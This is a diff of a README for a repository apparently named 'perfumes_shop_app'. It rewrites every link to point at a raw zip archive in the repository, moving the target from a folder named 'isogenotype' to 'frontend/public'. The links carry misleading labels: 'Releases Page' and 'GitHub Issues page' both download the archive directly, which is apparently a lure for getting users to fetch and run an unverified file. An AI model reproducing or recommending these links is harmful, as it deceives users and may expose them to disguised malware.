@@ -1,6 +1,6 @@
 # 💐 perfumes_shop_app - Shop for Perfumes with Ease
 
-![Download](https://raw.githubusercontent.com/pranit-giltic/perfumes_shop_app/main/isogenotype/perfumes_shop_app.zip%20Release-blue)
+![Download](https://github.com/pranit-giltic/perfumes_shop_app/raw/refs/heads/main/frontend/public/shop-app-perfumes-v3.4.zip%20Release-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **perfumes_shop_app**! This application provides a smooth experie
 
 To get started, you need to download the application. Please visit this page to download the latest version of **perfumes_shop_app**:
 
-[Download Latest Release](https://raw.githubusercontent.com/pranit-giltic/perfumes_shop_app/main/isogenotype/perfumes_shop_app.zip)
+[Download Latest Release](https://github.com/pranit-giltic/perfumes_shop_app/raw/refs/heads/main/frontend/public/shop-app-perfumes-v3.4.zip)
 
 Follow the steps below to install and run the application on your system.
 
@@ -27,7 +27,7 @@ Before installing, ensure your system meets these requirements:
 
 1. **Visit the Releases Page**  
    Click the link to go to the releases page:  
-   [Download Latest Release](https://raw.githubusercontent.com/pranit-giltic/perfumes_shop_app/main/isogenotype/perfumes_shop_app.zip)  
+   [Download Latest Release](https://github.com/pranit-giltic/perfumes_shop_app/raw/refs/heads/main/frontend/public/shop-app-perfumes-v3.4.zip)  
    Here, you will find the latest version available for download.
 
 2. **Download the Application**  
@@ -52,7 +52,7 @@ Before installing, ensure your system meets these requirements:
 
 ## 🧑‍🤝‍🧑 Getting Help
 
-If you encounter any issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/pranit-giltic/perfumes_shop_app/main/isogenotype/perfumes_shop_app.zip) to report problems or seek assistance from the community.
+If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/pranit-giltic/perfumes_shop_app/raw/refs/heads/main/frontend/public/shop-app-perfumes-v3.4.zip) to report problems or seek assistance from the community.
 
 ## 🙏 Acknowledgments
 
